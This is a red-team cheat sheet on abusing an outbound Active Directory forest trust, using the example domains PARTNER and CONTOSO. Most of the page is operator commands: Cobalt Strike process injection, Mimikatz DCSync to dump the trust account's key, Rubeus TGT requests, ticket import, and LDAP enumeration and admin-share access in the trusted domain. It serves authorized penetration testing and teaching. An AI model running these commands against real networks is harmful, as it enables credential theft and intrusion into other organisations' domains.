---
title: "Outbound Trusts · Trust Accounts and Enumeration"
description: "Identify the outbound trust perspective, recover the example trust-account secret with existing replication rights and request a remote-domain TGT for enumeration."
category: "Forest & Domain Trusts"
tools: ["Cobalt Strike", "Mimikatz", "Rubeus", "Kerbeus BOF", "PowerShell"]
updated: "2026-11-11"
tags: ["ad", "trusts", "forest", "kerberos", "enumeration"]
draft: false
---

## 1. Outbound means the opposite side of the access path

From **PARTNER**, a trust in CONTOSO is **outbound**. PARTNER is the trusting resource domain; CONTOSO is the trusted identity domain. CONTOSO users can access authorized PARTNER resources. An ordinary PARTNER identity does not receive the reverse access through this relationship.

```text
Trust:   PARTNER → CONTOSO
Access:  CONTOSO users → PARTNER resources, if authorized
```

The example starts in PARTNER and uses a compromised trust secret to authenticate as **`CONTOSO\PARTNER$`**. That is an identity in CONTOSO, despite its name referring to PARTNER. The result enables access according to that account's rights, not automatic CONTOSO administration.

## 2. Establish the current context and trust metadata

Run these commands in the PARTNER Beacon with the LDAP extension available:

```shell
getuid
# Example: PARTNER\vwebber

ldapsearch (objectClass=trustedDomain) --attributes trustDirection,trustPartner,trustAttributes,flatName,objectGUID
# Example: 2 | contoso.com | 8 | CONTOSO
# Record the actual contoso.com TDO objectGUID

# Baseline: ordinary PARTNER credentials may not bind to CONTOSO
ldapsearch (objectClass=domain) --hostname contoso.com --dn DC=contoso,DC=com --attributes name,objectSid
# Example result: Bind Failed: 49
```

`trustDirection: 2` is outbound relative to PARTNER; attribute bit `8` indicates a forest trust. LDAP error 49 reports invalid credentials. The error alone is not proof of a particular Kerberos failure or of the absence of all possible access paths.

## 3. Understand the trust account and directional secret

| Item | Location and role |
|---|---|
| `CONTOSO\PARTNER$` | Interdomain trust account in CONTOSO |
| CONTOSO TDO in PARTNER | Stores the corresponding trust information and secrets |
| TDO `objectGUID` | Selects the specific trust object for the example replication query |
| `[Out]` | Current outgoing secret material in the example output |
| `[Out-1]` | Previous outgoing secret material |

Select the key corresponding to the required direction and current trust state. Do not confuse it with either domain's `krbtgt` key. The example uses the current RC4 value; RC4 acceptance depends on the KDC's supported encryption and policy.

## 4. Recover the trust secret with replication rights

This stage requires existing replication rights in PARTNER. An ordinary user reading trust metadata cannot recover the secret through that LDAP query.

The example obtains an appropriate context by injecting into an identified PARTNER administrative process. Skip this transition if a suitable context is already available.

```shell
# Optional context transition from the original elevated Beacon
ps
inject <PARTNER_DA_PID> x64 tcp-local
# Use the configured listener and select the NEW Beacon when available

# In the context with PARTNER replication rights
getuid
mimikatz lsadump::dcsync /domain:partner.com /guid:{<CONTOSO_TDO_GUID>}
# Retain the current matching [Out] rc4_hmac_nt as <TRUST_RC4>
# [Out-1] is previous material, not an additional step
```

The TDO GUID and process PID must come from the current environment. Creating a new Beacon does not itself grant replication rights.

## 5. Authenticate to CONTOSO as its trust account

Request a TGT directly from the CONTOSO KDC. This is authentication as an account in CONTOSO, rather than forging an inter-realm referral.

```shell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:PARTNER$ /domain:CONTOSO.COM /dc:lon-dc-1.contoso.com /rc4:<TRUST_RC4> /nowrap
# Expected if accepted: TGT for PARTNER$ @ CONTOSO.COM
# Retain complete output as <TRUST_ACCOUNT_TGT_BASE64>

# Alternative extension command from the example; choose this OR Rubeus
krb_asktgt /user:PARTNER$ /rc4:<TRUST_RC4> /domain:contoso.com /dc:lon-dc-1.contoso.com
```

The `krb_asktgt` command requires the matching BOF/alias package loaded. Do not issue both requests as a required sequence.

Convert the returned TGT in **PowerShell on the operator's machine**:

```powershell
[IO.File]::WriteAllBytes('C:\Users\Attacker\Desktop\partner-tgt.kirbi', [Convert]::FromBase64String('<TRUST_ACCOUNT_TGT_BASE64>'))
```

## 6. Import the TGT and enumerate

Create a separate network-only test context and import the file from Beacon:

```shell
make_token CONTOSO\PARTNER$ FakePass
kerberos_ticket_use C:\Users\Attacker\Desktop\partner-tgt.kirbi
run klist
# Client: PARTNER$ @ CONTOSO.COM
# Server: krbtgt/CONTOSO.COM

ldapsearch (objectClass=domain) --hostname contoso.com --dn DC=contoso,DC=com --attributes name,objectSid
# Example result: name contoso and its domain SID
```

`FakePass` creates the network context; it is not the trust account's recovered password. The imported TGT supplies Kerberos material. The account's `primaryGroupID` is `513` in this scenario, which may not appear as an explicit `memberOf` entry.

Successful LDAP enumeration demonstrates access as that identity. It does not make `PARTNER$` a CONTOSO domain administrator or convert the relationship into a bidirectional trust.

```shell
# Purge only the selected test session before leaving it
kerberos_ticket_purge
rev2self
getuid
```

If a separate test Beacon was created, end that Beacon separately when finished. Do not terminate an unrelated user's process as default cleanup.

## 7. Alternative: an already available CONTOSO identity

If valid credentials for a CONTOSO account are already available, authenticate with that identity directly. This does not require recovery of the trust secret.

```shell
make_token CONTOSO\Administrator <PASSWORD>
ls \\lon-dc-1.contoso.com\c$
# Requires this account's actual administrative access on the target
rev2self
```

This uses a CONTOSO identity. It does not grant an ordinary PARTNER account reverse access through the trust.

## 8. Troubleshooting

| Symptom | What to check |
|---|---|
| Initial LDAP bind fails | Current identity, authentication and which direction permits access |
| Replication is denied | Effective replication rights in PARTNER |
| Trust key appears invalid | Correct TDO, direction, current versus previous material and encryption policy |
| TGT request fails | CONTOSO trust account name, KDC, key, clock and reachability |
| TGT imports but LDAP still fails | Selected session, ticket client, hostname, authorization and LDAP configuration |
| Administrative resource is denied | Expected unless the trust account has the required additional permissions |

## 9. Quick checklist

```text
PERSPECTIVE AND TDO
[ ] getuid → confirm the PARTNER starting context
[ ] ldapsearch (objectClass=trustedDomain) --attributes trustDirection,trustPartner,trustAttributes,flatName,objectGUID
[ ] Confirm outbound from PARTNER and record the CONTOSO TDO GUID
[ ] Distinguish CONTOSO\PARTNER$ from an ordinary PARTNER-domain identity

REPLICATION CONTEXT
[ ] Optional context transition: ps, then inject <PARTNER_DA_PID> x64 <LISTENER>
[ ] Select the new Beacon if one was created; getuid
[ ] mimikatz lsadump::dcsync /domain:partner.com /guid:{<CONTOSO_TDO_GUID>}
[ ] Select the matching current [Out] trust key, rather than [Out-1] or krbtgt

TGT — CHOOSE ONE REQUEST METHOD
[ ] execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:PARTNER$ /domain:CONTOSO.COM /dc:lon-dc-1.contoso.com /rc4:<TRUST_RC4> /nowrap
[ ] BOF alternative: krb_asktgt /user:PARTNER$ /rc4:<TRUST_RC4> /domain:contoso.com /dc:lon-dc-1.contoso.com
[ ] Local PowerShell: [IO.File]::WriteAllBytes('C:\path\partner-tgt.kirbi', [Convert]::FromBase64String('<TRUST_ACCOUNT_TGT_BASE64>'))

IMPORT AND ENUMERATE
[ ] make_token CONTOSO\PARTNER$ FakePass
[ ] kerberos_ticket_use C:\path\partner-tgt.kirbi
[ ] run klist → confirm PARTNER$ @ CONTOSO.COM and krbtgt/CONTOSO.COM
[ ] ldapsearch (objectClass=domain) --hostname contoso.com --dn DC=contoso,DC=com --attributes name,objectSid
[ ] Interpret results within the trust account's permissions
[ ] kerberos_ticket_purge → only the selected test cache
[ ] rev2self
[ ] getuid
```

## Related references

- [Inter-realm tickets and trust fundamentals](/cheatsheets/inter-realm-tickets-cheatsheet/)
- [Parent-child trusts](/cheatsheets/parent-child-trust-cheatsheet/)
- [Inbound trusts](/cheatsheets/inbound-trust-cheatsheet/)
- [Pass the Ticket](/cheatsheets/pass-the-ticket-cobalt-cheatsheet/)
